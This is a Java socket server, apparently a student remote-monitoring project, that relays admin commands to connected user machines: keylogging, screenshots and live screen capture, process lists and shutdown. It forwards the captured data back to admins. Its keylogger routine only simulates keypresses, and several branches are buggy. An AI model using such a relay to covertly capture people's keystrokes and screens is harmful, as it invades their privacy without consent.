package Controller;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import javax.imageio.ImageIO;

public class Server {
    private static List<UserHandler> userClients = new ArrayList<>();
    private static List<AdminHandler> adminClients = new ArrayList<>();
    private static Set<String> userConnectedIPs = new HashSet<>();
    private static Set<String> adminConnectedIPs = new HashSet<>();

    public static void main(String[] args) {
        int portNumber = 5254;

        try (ServerSocket serverSocket = new ServerSocket(portNumber)) {
            System.out.println("Server đang chạy cổng " + portNumber);

            while (true) {
                Socket clientSocket = serverSocket.accept();
                new Thread(new ConnectionHandler(clientSocket)).start();
            }
        } catch (IOException e) {
            System.err.println("Lỗi!!!: " + e.getMessage());
        }
    }

    private static class ConnectionHandler implements Runnable {
        private final Socket clientSocket;

        public ConnectionHandler(Socket socket) {
            this.clientSocket = socket;
        }

        @Override
        public void run() {
            try {
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                String clientType = in.readLine();
                String clientIP = clientSocket.getInetAddress().getHostAddress();
                System.out.println("Địa chỉ IP của client: " + clientIP);

                if ("USER".equals(clientType)) {
                    synchronized (userConnectedIPs) {
                        if (userConnectedIPs.contains(clientIP)) {
                            System.out.println("User IP " + clientIP + " đã kết nối đã tồn tại. Kết nối HỦY BỎ.");
                            clientSocket.close();
                            return;
                        } else {
                            userConnectedIPs.add(clientIP);
                        }
                    }
                    UserHandler userHandler = new UserHandler(clientSocket);
                    userClients.add(userHandler);
                    System.out.println("User client connected: " + clientSocket.getRemoteSocketAddress());
                    new Thread(userHandler).start();
                    notifyAdminClients("CONNECTED:" + userHandler.getClientName());

                } else if ("ADMIN".equals(clientType)) {
                    synchronized (adminConnectedIPs) {
                        if (adminConnectedIPs.contains(clientIP)) {
                            System.out.println("Admin IP " + clientIP + " đã kết nối đã tồn tại. Kết nối HỦY BỎ.");
                            clientSocket.close();
                            return;
                        } else {
                            adminConnectedIPs.add(clientIP);
                        }
                    }
                    AdminHandler adminHandler = new AdminHandler(clientSocket);
                    adminClients.add(adminHandler);
                    System.out.println("Admin client connected: " + clientSocket.getRemoteSocketAddress());
                    new Thread(adminHandler).start();
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            }
        }

        private void notifyAdminClients(String message) {
            for (AdminHandler admin : adminClients) {
                admin.sendSystemInfo(message);
            }
        }
    }

    private static class UserHandler implements Runnable {
        private final Socket clientSocket;
        private final String clientName;
        private PrintWriter out;
        private boolean sendingScreenshots = false;
        private boolean sendingKeylogger = false;

        public UserHandler(Socket socket) {
            this.clientSocket = socket;
            this.clientName = "PC" + (userClients.size() + 1); // Example naming scheme
        }

        public String getClientName() {
            return clientName;
        }

        @Override
        public void run() {
            String clientIP = clientSocket.getInetAddress().getHostAddress();
            try {
                out = new PrintWriter(clientSocket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));

                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    if (inputLine.startsWith("OS_INFO:")) {
                        String osInfo = inputLine.substring(8);
                        sendSystemInfoToAdmins(osInfo);                   
                    } else if (inputLine.startsWith("SCREENSHOT:")) {
                        String base64Image = inputLine.substring(11);
                        sendScreenshotToAdmins(base64Image);
                    } else if (inputLine.equals("START_VIDEO")) {
                        startSendingScreenshots();
                    } else if (inputLine.equals("STOP_VIDEO")) {
                        stopSendingScreenshots();
                    } else if (inputLine.startsWith("KEYLOG:")) {
                        String keylog = inputLine.substring(7);
                        sendKeylogToAdmins(keylog);
                    } else if (inputLine.startsWith("STOPKEYLOGGER")) {
                        stopKeylogging();
                    } else if (inputLine.startsWith("RUNNING_APPLICATIONS:")) {
                         String process = inputLine.substring(21);
                       sendRunningApplicationsToAdmins(getRunningProcess());
                           
                    }
                    
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            } finally {
                try {
                    clientSocket.close();
                    synchronized (userConnectedIPs) {
                        userConnectedIPs.remove(clientIP);
                    }
                    userClients.remove(this);
                } catch (IOException e) {
                    System.err.println("Error: " + e.getMessage());
                }
            }
        }

        public void sendCommand(String command) {
            if (out != null) {
                out.println(command);
            }
        }

        public void sendSystemInfoToAdmins(String info) {
            synchronized (userClients) {
                for (AdminHandler admin : adminClients) {
                    admin.sendSystemInfo(info);
                }
            }
        }

        public void sendScreenshotToAdmins(String base64Image) {
            synchronized (userClients) {
                for (AdminHandler admin : adminClients) {
                    admin.sendScreenshot(base64Image);
                }
            }
        }
        
        private void sendKeylogToAdmins(String keylog) {
            synchronized (userClients) {
                for (AdminHandler admin : adminClients) {
                    admin.sendKeylog(keylog);
                }
            }
        }

      

        public void startSendingScreenshots() {
            sendingScreenshots = true;
            new Thread(() -> {
                while (sendingScreenshots) {
                    String base64Image = takeScreenshot();
                    if (base64Image != null) {
                        sendCommand("SCREENSHOT:" + base64Image);
                    }
                    try {
                        Thread.sleep(100); // Adjust this value as needed
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }

        public void stopSendingScreenshots() {
            sendingScreenshots = false;
        }

        private String takeScreenshot() {
            try {
                Robot robot = new Robot();
                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(screenFullImage, "png", baos);
                byte[] imageBytes = baos.toByteArray();
                return Base64.getEncoder().encodeToString(imageBytes);
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }

        private void startKeylogging() {
        if (!sendingKeylogger) {
            sendingKeylogger = true;
            new Thread(() -> {
                try {
                    Robot robot = new Robot();
                    while (sendingKeylogger) {
                        for (int keyEvent = KeyEvent.VK_A; keyEvent <= KeyEvent.VK_Z; keyEvent++) {
                            if (sendingKeylogger) {
                                robot.keyPress(keyEvent);
                                robot.keyRelease(keyEvent);
                                String keylog = KeyEvent.getKeyText(keyEvent);
                                sendCommand("KEYLOG:" + keylog);
                            } else {
                                break;
                            }
                            try {
                                Thread.sleep(100); // Đợi giữa các sự kiện phím
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                } catch (AWTException e) {
                    e.printStackTrace();
                }
            }).start();
        }
    }

    private void stopKeylogging() {
        sendingKeylogger = false;
    }

       

    private String getRunningProcess() {
    try {
        Process process = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe /fo csv /nh");

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder stringBuilder = new StringBuilder();
        String line;

        while ((line = reader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }

        reader.close();

        return stringBuilder.toString();
    } catch (IOException e) {
        e.printStackTrace();
        return "";
    }
}

    
    public void sendRunningApplicationsToAdmins(String runningApplications) {
    synchronized (userClients) {
        for (AdminHandler admin : adminClients) {
            admin.sendRunningApplications(runningApplications);
        }
    }
}

       


}

    private static class AdminHandler implements Runnable {
        private final Socket adminSocket;
        private PrintWriter out;

        public AdminHandler(Socket socket) {
            this.adminSocket = socket;
        }

        @Override
        public void run() {
            String clientIP = adminSocket.getInetAddress().getHostAddress();
            try {
                out = new PrintWriter(adminSocket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(adminSocket.getInputStream()));

                String clientMessage;
                while ((clientMessage = in.readLine()) != null) {
                    handleAdminRequest(clientMessage);
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            } finally {
                try {
                    adminSocket.close();
                    synchronized (adminConnectedIPs) {
                        adminConnectedIPs.remove(clientIP);
                    }
                    adminClients.remove(this);
                } catch (IOException e) {
                    System.err.println("Error: " + e.getMessage());
                }
            }
        }

        public void sendSystemInfo(String info) {
            if (out != null) {
                out.println(info);
            }
        }

        public void sendScreenshot(String base64Image) {
            if (out != null) {
                out.println("SCREENSHOT:" + base64Image);
            }
        }

        public void sendKeylog(String keylog) {
            if (out != null) {
                out.println("KEYLOG:" + keylog);
            }
        }
        public void sendRunningApplications(String runningApplications) {    
            if (out != null) {
                out.println("RUNNING_APPLICATIONS:" + runningApplications);
            }
        }

        public void handleAdminRequest(String clientMessage) {
            if (clientMessage.startsWith("OS_INFO")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("OS_INFO");
                }
            
            } else if (clientMessage.startsWith("STARTKEYLOGGER")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("STARTKEYLLOGER");
                }
            } else if (clientMessage.startsWith("SCREENSHOT")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("SCREENSHOT");
                }
            } else if (clientMessage.startsWith("SHUTDOWN")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("SHUTDOWN");
                }
            } else if (clientMessage.startsWith("START_VIDEO")) {
                for (UserHandler user : userClients) {
                    user.startSendingScreenshots();
                }
            } else if (clientMessage.startsWith("STOP_VIDEO")) {
                for (UserHandler user : userClients) {
                    user.stopSendingScreenshots();
                }
            } else if (clientMessage.startsWith("GET_RUNNING_APPLICATIONS")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("GET_RUNNING_APPLICATIONS");
                }
            } else if (clientMessage.startsWith("STARTKEYLOGGER")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("STARTKEYLOGGER");
                }
            } else if (clientMessage.startsWith("STOPKEYLOGGER")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("STOPKEYLOGGER");
                }
            }
        }

        
    }
}
